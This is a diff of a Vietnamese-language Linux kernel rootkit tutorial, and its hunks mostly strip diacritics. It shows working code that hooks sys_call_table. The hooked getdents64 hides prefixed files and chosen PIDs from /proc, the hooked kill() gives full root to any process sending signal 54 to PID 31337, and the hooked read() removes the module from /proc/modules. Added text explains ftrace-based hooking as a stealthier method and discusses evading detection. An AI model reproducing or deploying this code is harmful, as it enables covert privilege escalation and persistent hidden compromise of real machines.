- * ls /proc → getdents64 → ta filter entries có PID cần ẩn.
- * Nhưng getdents64 cũng được gọi cho mọi directory khác.
- * Ta chỉ muốn filter PIDs khi đọc /proc, không phải /home/user/.
+ * Tai sao can: /proc chua thu muc cho moi process (named by PID).
+ * ls /proc -> getdents64 -> ta filter entries co PID can an.
+ * Nhung getdents64 cung duoc goi cho moi directory khac.
+ * Ta chi muon filter PIDs khi doc /proc, khong phai /home/user/.
  *
- * Cách check: theo fd → file struct → dentry → inode → superblock
- * Nếu superblock type là "proc" → đang đọc /proc. */
+ * Cach check: theo fd -> file struct -> dentry -> inode -> superblock
+ * Neu superblock type la "proc" -> dang doc /proc. */
 static bool is_proc_dir(int fd)
 {
     struct fd f;
     struct inode *inode;
     bool is_proc = false;
 
-    /* fdget() lấy struct file từ file descriptor.
-     * Tương tự fget() nhưng lightweight (không tăng refcount
-     * trong mọi trường hợp — dùng RCU protection thay vào). */
+    /* fdget() lay struct file tu file descriptor.
+     * Tuong tu fget() nhung lightweight (khong tang refcount
+     * trong moi truong hop — dung RCU protection thay vao). */
     f = fdget(fd);
     if (!f.file)
         return false;
 
-    /* Navigate: file → dentry → inode → superblock → type name
+    /* Navigate: file -> dentry -> inode -> superblock -> type name
      *
      * f.file->f_path.dentry = directory entry
      * dentry->d_inode = inode (in-memory representation of file)
@@ -1269,7 +2083,7 @@ static bool is_proc_dir(int fd)
 
 static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
 {
-    /* Extract arguments từ registers.
+    /* Extract arguments tu registers.
      * getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
      * fd    = regs->di  (arg1)
      * dirent = regs->si  (arg2, userspace pointer)
@@ -1278,9 +2092,9 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
     struct linux_dirent64 __user *user_dirent =
         (struct linux_dirent64 __user *)regs->si;
 
-    /* Gọi original getdents64.
+    /* Goi original getdents64.
      * Return value = total bytes of dirent data,
-     * hoặc 0 (end of directory), hoặc negative (error). */
+     * hoac 0 (end of directory), hoac negative (error). */
     long ret = orig_getdents64(regs);
 
     struct linux_dirent64 *kern_dirent = NULL;  /* Kernel-space copy */
@@ -1290,65 +2104,65 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
     bool is_proc = false;
     long original_ret = ret;
 
-    /* Nếu original trả về 0 (empty dir) hoặc error → pass through */
+    /* Neu original tra ve 0 (empty dir) hoac error -> pass through */
     if (ret <= 0)
         return ret;
 
-    /* Allocate kernel buffer và copy data từ userspace.
+    /* Allocate kernel buffer va copy data tu userspace.
      *
-     * Tại sao copy: ta không thể safely iterate userspace buffer
+     * Tai sao copy: ta khong the safely iterate userspace buffer
      * trong kernel context (page fault risk, TOCTOU race).
-     * Copy vào kernel → modify → copy ngược lại.
+     * Copy vao kernel -> modify -> copy nguoc lai.
      *
-     * GFP_KERNEL: allocation CÓ THỂ sleep (process context OK).
-     * Dùng GFP_ATOMIC nếu trong interrupt context. */
+     * GFP_KERNEL: allocation CO THE sleep (process context OK).
+     * Dung GFP_ATOMIC neu trong interrupt context. */
     kern_dirent = kzalloc(ret, GFP_KERNEL);
     if (!kern_dirent)
-        return ret;  /* Allocation fail → trả về unfiltered result */
+        return ret;  /* Allocation fail -> tra ve unfiltered result */
 
-    /* copy_from_user(): copy data từ userspace vào kernel buffer.
+    /* copy_from_user(): copy data tu userspace vao kernel buffer.
      * Return 0 on success, non-zero = number of bytes NOT copied.
      *
-     * PHẢI dùng copy_from_user() (không phải memcpy) vì:
-     * 1. Userspace pointer có thể invalid → page fault handled gracefully
-     * 2. SMAP enforcement — kernel không access user pages trực tiếp
-     * 3. copy_from_user() có proper access checking */
+     * PHAI dung copy_from_user() (khong phai memcpy) vi:
+     * 1. Userspace pointer co the invalid -> page fault handled gracefully
+     * 2. SMAP enforcement — kernel khong access user pages truc tiep
+     * 3. copy_from_user() co proper access checking */
     if (copy_from_user(kern_dirent, user_dirent, ret)) {
         kfree(kern_dirent);
         return ret;
     }
 
-    /* Kiểm tra có đang đọc /proc không (cho PID hiding) */
+    /* Kiem tra co dang doc /proc khong (cho PID hiding) */
     is_proc = is_proc_dir(fd);
 
-    /* ────── Duyệt và filter entries ──────
+    /* ────── Duyet va filter entries ──────
      *
-     * Memory layout của kern_dirent buffer:
+     * Memory layout cua kern_dirent buffer:
      *
      * offset=0          offset+=d_reclen[0]    offset+=d_reclen[1]
-     *   ▼                    ▼                      ▼
-     *   ┌──────────────┬────────────────┬──────────────────┐
-     *   │  entry 0     │   entry 1      │   entry 2        │
-     *   │  d_reclen=32 │   d_reclen=40  │   d_reclen=28    │
-     *   │  d_name="."  │   d_name="rk_" │   d_name="foo"   │
-     *   └──────────────┴────────────────┴──────────────────┘
-     *                    ↑ HIDDEN (prefix match)
+     *   v                    v                      v
+     *   +--------------+----------------+------------------+
+     *   |  entry 0     |   entry 1      |   entry 2        |
+     *   |  d_reclen=32 |   d_reclen=40  |   d_reclen=28    |
+     *   |  d_name="."  |   d_name="rk_" |   d_name="foo"   |
+     *   +--------------+----------------+------------------+
+     *                    ^ HIDDEN (prefix match)
      *
-     * Để "xóa" entry, ta có 2 strategies:
+     * De "xoa" entry, ta co 2 strategies:
      *
-     * Strategy A (dùng ở đây): Tăng d_reclen của entry TRƯỚC
-     *   Entry trước "nuốt" entry cần ẩn bằng cách mở rộng d_reclen.
-     *   Userspace code dùng d_reclen để nhảy tới entry kế tiếp,
-     *   nên entry bị "nuốt" sẽ bị skip.
+     * Strategy A (dung o day): Tang d_reclen cua entry TRUOC
+     *   Entry truoc "nuot" entry can an bang cach mo rong d_reclen.
+     *   Userspace code dung d_reclen de nhay toi entry ke tiep,
+     *   nen entry bi "nuot" se bi skip.
      *
-     *   Trước:  [entry_prev, reclen=32] [entry_hidden, reclen=40] [entry_next]
+     *   Truoc:  [entry_prev, reclen=32] [entry_hidden, reclen=40] [entry_next]
      *   Sau:    [entry_prev, reclen=72]                           [entry_next]
      *
-     * Strategy B: memmove entries phía sau lên, giảm total ret.
-     *   Đơn giản hơn nhưng memmove costly nếu nhiều entries.
+     * Strategy B: memmove entries phia sau len, giam total ret.
+     *   Don gian hon nhung memmove costly neu nhieu entries.
      *
-     * Edge case: entry cần ẩn là entry ĐẦU TIÊN (không có prev).
-     * → Dùng memmove đẩy mọi thứ lên, giảm ret.
+     * Edge case: entry can an la entry DAU TIEN (khong co prev).
+     * -> Dung memmove day moi thu len, giam ret.
      */
 
     offset = 0;
@@ -1356,8 +2170,8 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
         current_entry = (struct linux_dirent64 *)((char *)kern_dirent + offset);
 
         /* Validate d_reclen — protect against corrupted entries.
-         * d_reclen == 0 → offset không advance → infinite loop.
-         * d_reclen > remaining → overread past buffer boundary. */
+         * d_reclen == 0 -> offset khong advance -> infinite loop.
+         * d_reclen > remaining -> overread past buffer boundary. */
         if (current_entry->d_reclen == 0)
             break;
         if (current_entry->d_reclen > (ret - offset))
@@ -1365,17 +2179,17 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
 
         bool should_hide = false;
 
-        /* Check 1: File hiding — d_name bắt đầu bằng HIDDEN_PREFIX */
+        /* Check 1: File hiding — d_name bat dau bang HIDDEN_PREFIX */
         if (strncmp(current_entry->d_name, HIDDEN_PREFIX,
                     strlen(HIDDEN_PREFIX)) == 0) {
             should_hide = true;
         }
 
-        /* Check 2: Process hiding — đang đọc /proc và d_name là PID ẩn */
+        /* Check 2: Process hiding — dang doc /proc va d_name la PID an */
         if (is_proc && !should_hide) {
             long pid_val;
-            /* kstrtol: convert string → long. Return 0 on success.
-             * Nếu d_name không phải number → không phải PID entry → skip */
+            /* kstrtol: convert string -> long. Return 0 on success.
+             * Neu d_name khong phai number -> khong phai PID entry -> skip */
             if (kstrtol(current_entry->d_name, 10, &pid_val) == 0) {
                 if (is_pid_hidden((pid_t)pid_val))
                     should_hide = true;
@@ -1383,32 +2197,32 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
         }
 
         if (should_hide) {
-            /* Case: entry cần ẩn là entry đầu tiên */
+            /* Case: entry can an la entry dau tien */
             if (current_entry == kern_dirent) {
-                /* Shift mọi thứ lên, overwrite entry đầu.
-                 * ret giảm = size entry bị remove. */
+                /* Shift moi thu len, overwrite entry dau.
+                 * ret giam = size entry bi remove. */
                 ret -= current_entry->d_reclen;
                 memmove(current_entry,
                         (char *)current_entry + current_entry->d_reclen,
                         ret);
-                /* KHÔNG tăng offset — vị trí hiện tại giờ chứa
-                 * entry kế tiếp (đã shift lên), cần check lại. */
+                /* KHONG tang offset — vi tri hien tai gio chua
+                 * entry ke tiep (da shift len), can check lai. */
                 continue;
             }
 
-            /* Case: entry ở giữa hoặc cuối — "nuốt" vào entry trước */
+            /* Case: entry o giua hoac cuoi — "nuot" vao entry truoc */
             prev_entry->d_reclen += current_entry->d_reclen;
-            /* Không cần memmove — entry vẫn ở đó nhưng userspace
-             * sẽ skip nó vì prev->d_reclen đã mở rộng qua. */
+            /* Khong can memmove — entry van o do nhung userspace
+             * se skip no vi prev->d_reclen da mo rong qua. */
         } else {
-            /* Entry hợp lệ — ghi nhớ làm prev cho lần sau */
+            /* Entry hop le — ghi nho lam prev cho lan sau */
             prev_entry = current_entry;
         }
 
         offset += current_entry->d_reclen;
     }
 
-    /* Copy kết quả filtered trở lại userspace */
+    /* Copy ket qua filtered tro lai userspace */
     copy_to_user(user_dirent, kern_dirent, ret);
 
     kfree(kern_dirent);
@@ -1418,23 +2232,23 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
 /* ══════════════════════════════════════════════════════════════
  * HOOK: kill — Magic signal command interface
  *
- * Tại sao dùng kill():
- * 1. kill() là syscall "vô hại" — không ai suspect
- * 2. Có thể gọi từ bất kỳ đâu: kill -54 31337
- * 3. Flexible: dùng PID parameter để encode command
- * 4. Không cần file/socket — stateless triggering
+ * Tai sao dung kill():
+ * 1. kill() la syscall "vo hai" — khong ai suspect
+ * 2. Co the goi tu bat ky dau: kill -54 31337
+ * 3. Flexible: dung PID parameter de encode command
+ * 4. Khong can file/socket — stateless triggering
  *
- * APT pattern: BPFDoor dùng magic packet, Drovorub dùng ioctl.
- * kill() signal approach phổ biến trong educational rootkits
- * (Diamorphine, Reptile). APT thường dùng network trigger
- * vì không cần local access.
+ * APT pattern: BPFDoor dung magic packet, Drovorub dung ioctl.
+ * kill() signal approach pho bien trong educational rootkits
+ * (Diamorphine, Reptile). APT thuong dung network trigger
+ * vi khong can local access.
  *
  * Command encoding:
  *   signal = MAGIC_SIGNAL (54)
  *   pid    = command selector:
  *     - MAGIC_PID (31337):      give root cho calling process
  *     - HIDE_MODULE_PID (31338): toggle module visibility
- *     - Any real PID:           toggle hide/show cho process đó
+ *     - Any real PID:           toggle hide/show cho process do
  * ══════════════════════════════════════════════════════════════ */
 
 static asmlinkage long hooked_kill(const struct pt_regs *regs)
@@ -1442,29 +2256,29 @@ static asmlinkage long hooked_kill(const struct pt_regs *regs)
     pid_t target_pid = (pid_t)regs->di;  /* arg1: target PID */
     int   sig        = (int)regs->si;    /* arg2: signal number */
 
-    /* Chỉ intercept magic signal — mọi signal khác pass through */
+    /* Chi intercept magic signal — moi signal khac pass through */
     if (sig != MAGIC_SIGNAL)
         return orig_kill(regs);
 
     /* ──── Command: Give Root ──── */
     if (target_pid == MAGIC_PID) {
-        /* prepare_creds(): allocate bản copy của current credentials.
+        /* prepare_creds(): allocate ban copy cua current credentials.
          *
          * Kernel credential model:
-         *   Mỗi process có `cred` struct chứa:
+         *   Moi process co `cred` struct chua:
          *   - uid/gid: real user/group ID
          *   - euid/egid: effective (used cho permission checks)
          *   - suid/sgid: saved (cho seteuid)
          *   - fsuid/fsgid: filesystem (cho file access checks)
          *   - cap_*: capabilities (fine-grained privileges)
          *
-         *   Credentials là immutable — để thay đổi:
-         *   1. prepare_creds() → tạo bản copy mutable
-         *   2. Modify bản copy
-         *   3. commit_creds() → swap bản cũ bằng bản mới atomically
+         *   Credentials la immutable — de thay doi:
+         *   1. prepare_creds() -> tao ban copy mutable
+         *   2. Modify ban copy
+         *   3. commit_creds() -> swap ban cu bang ban moi atomically
          *
-         *   Tại sao immutable + copy-on-write:
-         *   - Thread-safe: threads khác đọc cred cũ không bị race
+         *   Tai sao immutable + copy-on-write:
+         *   - Thread-safe: threads khac doc cred cu khong bi race
          *   - RCU-protected: readers lock-free
          */
         struct cred *new_cred = prepare_creds();
@@ -1491,28 +2305,28 @@ static asmlinkage long hooked_kill(const struct pt_regs *regs)
          *   CAP_DAC_OVERRIDE: bypass file permission checks
          *   ... 40+ capabilities total
          *
-         * CAP_FULL_SET = bitmask với tất cả capability bits = 1.
-         * Setting tất cả 5 capability sets = unrestricted root. */
+         * CAP_FULL_SET = bitmask voi tat ca capability bits = 1.
+         * Setting tat ca 5 capability sets = unrestricted root. */
         new_cred->cap_inheritable = CAP_FULL_SET;
         new_cred->cap_permitted   = CAP_FULL_SET;
         new_cred->cap_effective   = CAP_FULL_SET;
         new_cred->cap_bset        = CAP_FULL_SET;
         new_cred->cap_ambient     = CAP_FULL_SET;
 
-        /* commit_creds(): Atomic swap cred cũ bằng cred mới.
+        /* commit_creds(): Atomic swap cred cu bang cred moi.
          *
-         * Từ thời điểm này, current process = root + full caps.
-         * Process CÓ THỂ:
-         *   - Read/write mọi file
-         *   - Kill mọi process
+         * Tu thoi diem nay, current process = root + full caps.
+         * Process CO THE:
+         *   - Read/write moi file
+         *   - Kill moi process
          *   - Load kernel modules
          *   - Mount filesystems
-         *   - Mọi thứ root làm được
+         *   - Moi thu root lam duoc
          *
-         * commit_creds() cũng free cred cũ (via RCU). */
+         * commit_creds() cung free cred cu (via RCU). */
         commit_creds(new_cred);
 
-        return 0;  /* Return 0 (success) — user thấy kill() thành công */
+        return 0;  /* Return 0 (success) — user thay kill() thanh cong */
     }
 
     /* ──── Command: Toggle Module Visibility ──── */
@@ -1540,21 +2354,21 @@ static asmlinkage long hooked_kill(const struct pt_regs *regs)
 /* ══════════════════════════════════════════════════════════════
  * HOOK: read — Filter /proc/modules output (backup module hiding)
  *
- * Tại sao hook read():
- *   cat /proc/modules hoặc lsmod gọi read() trên /proc/modules.
- *   Output chứa tên tất cả loaded modules.
- *   Hook read() cho /proc/modules → filter dòng có tên rootkit.
+ * Tai sao hook read():
+ *   cat /proc/modules hoac lsmod goi read() tren /proc/modules.
+ *   Output chua ten tat ca loaded modules.
+ *   Hook read() cho /proc/modules -> filter dong co ten rootkit.
  *
- * Đây là BACKUP cho module list_del hiding (Chapter 6).
- * Dù đã list_del, một số tools access /proc/modules trực tiếp
- * hoặc qua sysfs, nên cần defense-in-depth.
+ * Day la BACKUP cho module list_del hiding (Chapter 6).
+ * Du da list_del, mot so tools access /proc/modules truc tiep
+ * hoac qua sysfs, nen can defense-in-depth.
  *
- * CẢNH BÁO: Hook read() ảnh hưởng PERFORMANCE vì read()
- * là syscall được gọi nhiều nhất. Phải check nhanh và bail
- * sớm nếu không phải target file.
+ * CANH BAO: Hook read() anh huong PERFORMANCE vi read()
+ * la syscall duoc goi nhieu nhat. Phai check nhanh va bail
+ * som neu khong phai target file.
  * ══════════════════════════════════════════════════════════════ */
 
-/* Kiểm tra xem file descriptor có trỏ tới file cụ thể không */
+/* Kiem tra xem file descriptor co tro toi file cu the khong */
 static bool is_target_file(int fd, const char *target_path)
 {
     struct fd f;
@@ -1566,8 +2380,8 @@ static bool is_target_file(int fd, const char *target_path)
     if (!f.file)
         return false;
 
-    /* d_path(): convert dentry → full path string.
-     * Cần buffer vì path build ngược từ dentry lên root. */
+    /* d_path(): convert dentry -> full path string.
+     * Can buffer vi path build nguoc tu dentry len root. */
     path = d_path(&f.file->f_path, buf, sizeof(buf));
     if (!IS_ERR(path))
         match = (strcmp(path, target_path) == 0);
@@ -1581,7 +2395,7 @@ static asmlinkage long hooked_read(const struct pt_regs *regs)
     int fd = (int)regs->di;
     char __user *user_buf = (char __user *)regs->si;
 
-    /* Gọi original read trước */
+    /* Goi original read truoc */
     long ret = orig_read(regs);
 
     char *kern_buf;
@@ -1590,12 +2404,12 @@ static asmlinkage long hooked_read(const struct pt_regs *regs)
     if (ret <= 0)
         return ret;
 
-    /* Fast path: chỉ filter /proc/modules
-     * Gọi is_target_file() chỉ khi ret > 0 để tránh overhead. */
+    /* Fast path: chi filter /proc/modules
+     * Goi is_target_file() chi khi ret > 0 de tranh overhead. */
     if (!is_target_file(fd, "/proc/modules"))
-        return ret;  /* Không phải target → trả về nguyên */
+        return ret;  /* Khong phai target -> tra ve nguyen */
 
-    /* Copy, filter, copy back — giống pattern getdents64 */
+    /* Copy, filter, copy back — giong pattern getdents64 */
     kern_buf = kzalloc(ret + 1, GFP_KERNEL);
     if (!kern_buf)
         return ret;
@@ -1606,28 +2420,28 @@ static asmlinkage long hooked_read(const struct pt_regs *regs)
     }
     kern_buf[ret] = '\0';
 
-    /* /proc/modules format (mỗi dòng = 1 module):
+    /* /proc/modules format (moi dong = 1 module):
      *   "module_name size refcount deps state address\n"
-     *   Ví dụ: "rk 16384 0 - Live 0xffffffffc0a80000\n"
+     *   Vi du: "rk 16384 0 - Live 0xffffffffc0a80000\n"
      *
-     * Filter: xóa mọi dòng chứa tên module rootkit. */
+     * Filter: xoa moi dong chua ten module rootkit. */
     line_start = kern_buf;
     while (*line_start) {
         line_end = strchr(line_start, '\n');
         if (!line_end)
             break;
 
-        /* So sánh đầu dòng với module name */
+        /* So sanh dau dong voi module name */
         if (strncmp(line_start, THIS_MODULE->name,
                     strlen(THIS_MODULE->name)) == 0) {
-            /* Xóa dòng này bằng cách shift phần còn lại lên */
+            /* Xoa dong nay bang cach shift phan con lai len */
             int line_len = (line_end + 1) - line_start;
             memmove(line_start, line_end + 1,
                     ret - (line_end + 1 - kern_buf));
             ret -= line_len;
-            kern_buf[ret] = '\0';  /* Null-terminate tại boundary mới */
-            /* Không advance line_start — vị trí này giờ chứa
-             * dòng kế tiếp (đã shift) */
+            kern_buf[ret] = '\0';  /* Null-terminate tai boundary moi */
+            /* Khong advance line_start — vi tri nay gio chua
+             * dong ke tiep (da shift) */
             continue;
         }
 
@@ -1645,7 +2459,7 @@ static asmlinkage long hooked_read(const struct pt_regs *regs)
 
 int rk_install_hooks(void)
 {
-    /* Step 1: Tìm sys_call_table */
+    /* Step 1: Tim sys_call_table */
     sys_call_table = (unsigned long *)rk_lookup_name("sys_call_table");
     if (!sys_call_table) {
         pr_err("rk: cannot find sys_call_table\n");
@@ -1655,10 +2469,10 @@ int rk_install_hooks(void)
 
     /* Step 2: Save original handlers.
      *
-     * CRITICAL: phải save TRƯỚC KHI overwrite.
-     * Nếu quên → không thể gọi original → system unusable.
-     * Nếu quên restore khi rmmod → crash sau khi module unloaded
-     * vì syscall sẽ jump tới freed memory. */
+     * CRITICAL: phai save TRUOC KHI overwrite.
+     * Neu quen -> khong the goi original -> system unusable.
+     * Neu quen restore khi rmmod -> crash sau khi module unloaded
+     * vi syscall se jump toi freed memory. */
     orig_getdents64 = (syscall_fn_t)sys_call_table[__NR_getdents64];
     orig_getdents   = (syscall_fn_t)sys_call_table[__NR_getdents];
     orig_kill       = (syscall_fn_t)sys_call_table[__NR_kill];
@@ -1666,11 +2480,11 @@ int rk_install_hooks(void)
 
     /* Step 3: Overwrite syscall table entries.
      *
-     * Giữa unprotect và protect, code này PHẢI chạy nhanh.
-     * Không allocate memory, không sleep, không gọi function
-     * phức tạp — chỉ ghi 8 bytes per entry.
+     * Giua unprotect va protect, code nay PHAI chay nhanh.
+     * Khong allocate memory, khong sleep, khong goi function
+     * phuc tap — chi ghi 8 bytes per entry.
      *
-     * Barrier(mb/wmb) không cần vì chỉ ghi aligned 8-byte values
+     * Barrier(mb/wmb) khong can vi chi ghi aligned 8-byte values
      * — x86 guarantees atomicity cho aligned quad-word writes. */
     rk_unprotect_memory();
 
@@ -1692,14 +2506,14 @@ void rk_remove_hooks(void)
 
     /* Restore original handlers.
      *
-     * QUAN TRỌNG: phải restore theo đúng thứ tự:
+     * QUAN TRONG: phai restore theo dung thu tu:
      * 1. Unprotect memory
-     * 2. Restore TẤT CẢ entries
+     * 2. Restore TAT CA entries
      * 3. Protect memory
      *
-     * Nếu module unload mà không restore → instant crash
-     * khi bất kỳ process nào gọi hooked syscall, vì code
-     * tại hook address đã bị freed. */
+     * Neu module unload ma khong restore -> instant crash
+     * khi bat ky process nao goi hooked syscall, vi code
+     * tai hook address da bi freed. */
     rk_unprotect_memory();
 
     sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
@@ -1709,9 +2523,9 @@ void rk_remove_hooks(void)
 
     rk_protect_memory();
 
-    /* Memory barrier: đảm bảo mọi CPU thấy restored values
-     * trước khi module memory bị freed. */
-    msleep(10);  /* Cho time để in-flight syscalls hoàn thành */
+    /* Memory barrier: dam bao moi CPU thay restored values
+     * truoc khi module memory bi freed. */
+    msleep(10);  /* Cho time de in-flight syscalls hoan thanh */
 
     pr_info("rk: syscall hooks removed\n");
 }
@@ -1719,59 +2533,243 @@ void rk_remove_hooks(void)
 
 ---
 
-## Chapter 4: Ftrace-based Hooking — Kỹ thuật hiện đại
+## Chapter 4: Ftrace-based Hooking — Ky thuat hien dai
 
-### 4.1 Ftrace Framework — Kiến trúc hooking
+### 4.0 Ftrace Internals — Cach kernel instrument moi function
+
+Ftrace (Function Tracer) la kernel framework cho tracing va profiling. Rootkit lam dung ftrace de hook bat ky kernel function nao ma khong can thay doi sys_call_table. Phan nay giai thich ftrace hoat dong nhu the nao tai muc low-level.
+
+#### GCC -mfentry: Compiler instrumentation
+
+Khi kernel duoc build voi `CONFIG_FUNCTION_TRACER=y` (mac dinh tren hau het distros), GCC them flag `-mfentry`. Flag nay lam compiler chen mot `call __fentry__` tai **INSTRUCTION DAU TIEN** cua **MOI** kernel function:
+
+```
+Khong co -mfentry:           Voi -mfentry:
+                              
+my_function:                  my_function:
+  push rbp                      call __fentry__    <-- 5 bytes (E8 xx xx xx xx)
+  mov rbp, rsp                  push rbp
+  sub rsp, 0x20                 mov rbp, rsp
+  ...                           sub rsp, 0x20
+                                ...
+
+Tai sao DAU TIEN (khong phai sau prologue):
+  -mfentry chen TRUOC frame setup (push rbp/mov rbp,rsp).
+  Flag cu hon -pg chen SAU prologue -> kho modify stack.
+  -mfentry cho phep ftrace thay doi stack va registers
+  truoc khi function setup bat ky state nao.
+```
+
+#### Boot time: NOP patching
+
+Tai boot, kernel thay the TAT CA `call __fentry__` bang NOPs (5-byte NOP instruction). Dieu nay duoc thuc hien boi `ftrace_init()` trong `kernel/trace/ftrace.c`:
+
+```
+Truoc (compile time):     Sau (boot time, ftrace_init):
+  
+  E8 xx xx xx xx           0F 1F 44 00 00
+  (call __fentry__)        (5-byte NOP: nopl 0x0(%rax,%rax,1))
+  
+Ket qua: MOI kernel function chay tai full speed khi khong co tracer.
+Overhead = 0 (NOP hau nhu khong ton thoi gian tren CPU hien dai).
+
+Kernel luu vi tri cua MOI NOP trong bang ftrace_pages:
+  struct dyn_ftrace {
+      unsigned long ip;        // address cua NOP (= function entry)
+      unsigned long flags;     // ENABLED, REGS_EN, etc.
+      struct dyn_arch_ftrace arch;  // architecture-specific data
+  };
+  
+  ftrace_pages: array of pages, moi page chua nhieu dyn_ftrace entries.
+  Total: ~50,000-80,000 entries cho typical kernel (MOI function mot entry).
+```
+
+#### Khi ftrace activate mot function
+
+Khi ban goi `register_ftrace_function(&ops)` voi filter cho function cu the, kernel lam:
+
+```
+Buoc 1: Tim dyn_ftrace entry cho target function address
+Buoc 2: Thay NOP bang CALL:
+
+  Truoc (NOP):     0F 1F 44 00 00     (5-byte NOP, does nothing)
+  Sau (active):    E8 xx xx xx xx     (call ftrace_caller)
+
+  xx xx xx xx = relative offset toi ftrace_caller
+  (hoac ftrace_regs_caller neu SAVE_REGS flag)
+
+Buoc 2 duoc thuc hien an toan cho SMP qua text_poke_bp():
+
+  text_poke_bp() algorithm (an toan cho multi-CPU):
+  1. Thay byte dau tien bang INT3 (0xCC)
+     -> Neu CPU khac dang execute tai day, no hit INT3
+     -> INT3 handler biet day la ftrace patching, xu ly dung
+  2. Synchronize tat ca CPUs (IPI — Inter-Processor Interrupt)
+  3. Patch cac bytes 2-5 (phan con lai cua instruction)
+  4. Synchronize lai
+  5. Thay INT3 (byte 1) bang byte dung (E8 — opcode cua CALL)
+  6. Synchronize lan cuoi
+
+  Tai sao phuc tap: Neu CPU khac dang fetch instruction tai vi tri
+  dang bi patch, no co the thay instruction bi corrupt (nua cu nua moi).
+  INT3 trick dam bao: hoac CPU thay NOP cu, hoac thay INT3 (handled),
+  hoac thay CALL moi. Khong bao gio thay trang thai trung gian.
+```
+
+#### ftrace_caller — Assembly dispatcher
+
+Khi function duoc trace va CPU execute `call ftrace_caller`, doan assembly trong `arch/x86/kernel/ftrace_64.S` chay:
+
+```
+ftrace_caller (hoac ftrace_regs_caller neu SAVE_REGS):
+  ; Tai thoi diem nay:
+  ;   RSP -> return address (= address ngay sau call __fentry__ = function body)
+  ;   [RSP+8] -> original caller's return address (ai goi target function)
+
+  ; Save tat ca registers de tao struct pt_regs
+  push rbp
+  push r15, r14, r13, r12, r11, r10, r9, r8
+  push rdi, rsi, rdx, rcx, rbx, rax
+  ; ... (build complete pt_regs tren stack)
+  
+  ; Setup arguments cho C callback:
+  mov rdi, [rsp + ip_offset]     ; arg1: ip = address cua hooked function
+  mov rsi, [rsp + parent_offset] ; arg2: parent_ip = ai goi function nay
+  lea rdx, [rsp + ops_offset]    ; arg3: ftrace_ops pointer
+  lea rcx, [rsp]                 ; arg4: ftrace_regs (= pt_regs tren stack)
+  
+  ; Goi callback function
+  call *ftrace_ops_list_func     ; Iterate qua registered ops
+                                 ; va goi moi ops->func()
+  
+  ; Callback co the da thay doi regs->ip!
+  ; Neu regs->ip thay doi -> CPU se jump toi address moi
+  ; thay vi tiep tuc function goc.
+  
+  ; Restore registers tu pt_regs (co the da bi modify)
+  pop rax, rbx, rcx, rdx, rsi, rdi
+  pop r8, r9, r10, r11, r12, r13, r14, r15
+  pop rbp
+  
+  ; Return -> neu ip khong thay doi: tiep tuc function goc
+  ;        -> neu ip da thay doi: jump toi hook function
+  ret
+```
+
+#### FTRACE_OPS_FL_SAVE_REGS
+
+Flag nay bat ftrace luu TOAN BO registers vao `pt_regs` struct truoc khi goi callback:
+
+```
+Khong co SAVE_REGS:
+  Callback nhan: ip, parent_ip, ops, NULL (khong co regs)
+  -> Khong the doc/modify registers
+  -> Chi de tracing/logging
+
+Voi SAVE_REGS:
+  Callback nhan: ip, parent_ip, ops, ftrace_regs (chua pt_regs)
+  -> Co the doc moi register (bao gom arguments trong rdi, rsi, ...)
+  -> Co the MODIFY registers (bao gom regs->ip!)
+  -> BAT BUOC cho rootkit hooking (can modify ip de redirect)
+```
+
+#### FTRACE_OPS_FL_IPMODIFY
+
+Flag nay khai bao rang callback SE thay doi `regs->ip` (instruction pointer):
+
+```
+Rang buoc quan trong:
+  - Chi 1 IPMODIFY callback cho 1 function tai 1 thoi diem
+  - Neu tracer khac da register IPMODIFY cho function do
+    -> register_ftrace_function() tra ve -EBUSY
+  - Kernel dung rang buoc nay de tranh conflict:
+    2 tracers cung thay doi ip = undefined behavior
+
+Rootkit implication:
+  Neu system co tracing tool (perf, bpftrace) dung IPMODIFY
+  tren cung function -> rootkit hook FAIL.
+  Rootkit nang cao: check truoc, neu bi conflict thi 
+  unregister tracer kia truoc (nhung de bi detect).
+```
+
+#### Recursion prevention
+
+Khi hook function A, va hook function cua ban goi function B, ma B cung duoc ftrace-traced:
+
+```
+Khong co prevention:
+  kernel goi A -> ftrace -> hook_A() -> goi B -> ftrace -> hook_B()
+  -> neu hook_B goi A -> ftrace -> hook_A() -> ... -> STACK OVERFLOW
+
+Ftrace co per-CPU recursion counter:
+  Moi lan ftrace callback duoc goi, counter tang.
+  Neu counter > 0 khi vao callback -> recursion detected -> skip hook.
+  
+Rootkit dung them within_module() check:
+  Neu parent_ip (caller) nam TRONG module -> dang goi tu hook code
+  -> KHONG redirect, cho original chay binh thuong.
+  
+  Neu parent_ip nam NGOAI module -> goi tu kernel/userspace
+  -> Redirect sang hook function.
+
+Day la ly do ftrace_thunk() co dong:
+  if (!within_module(parent_ip, THIS_MODULE))
+      regs->ip = (unsigned long)hook->function;
+```
+
+---
+
+### 4.1 Ftrace Framework — Kien truc hooking
 
 ```c
 /* ftrace_hooks.c — Production-grade ftrace hooking framework
  *
  * Ftrace = Function Tracer — kernel framework cho tracing/profiling.
- * Designed cho debugging, nhưng rootkits lạm dụng để hook functions.
+ * Designed cho debugging, nhung rootkits lam dung de hook functions.
  *
- * TẠI SAO FTRACE THAY VÌ SYSCALL TABLE:
+ * TAI SAO FTRACE THAY VI SYSCALL TABLE:
  *
- * 1. Không cần tìm sys_call_table
- *    → Loại bỏ bước phức tạp nhất & dễ detect nhất
+ * 1. Khong can tim sys_call_table
+ *    -> Loai bo buoc phuc tap nhat & de detect nhat
  *
- * 2. Không cần disable CR0.WP
- *    → Không trigger CR0 monitoring
- *    → Không cần write vào read-only memory
+ * 2. Khong can disable CR0.WP
+ *    -> Khong trigger CR0 monitoring
+ *    -> Khong can write vao read-only memory
  *
- * 3. Hook BẤT KỲ kernel function, không chỉ syscalls
- *    → Hook internal functions sâu hơn, khó detect hơn
- *    → Ví dụ: hook tcp_v4_connect() thay vì sys_connect()
+ * 3. Hook BAT KY kernel function, khong chi syscalls
+ *    -> Hook internal functions sau hon, kho detect hon
+ *    -> Vi du: hook tcp_v4_connect() thay vi sys_connect()
  *
  * 4. Kernel manage concurrency
- *    → Ftrace framework handle SMP synchronization
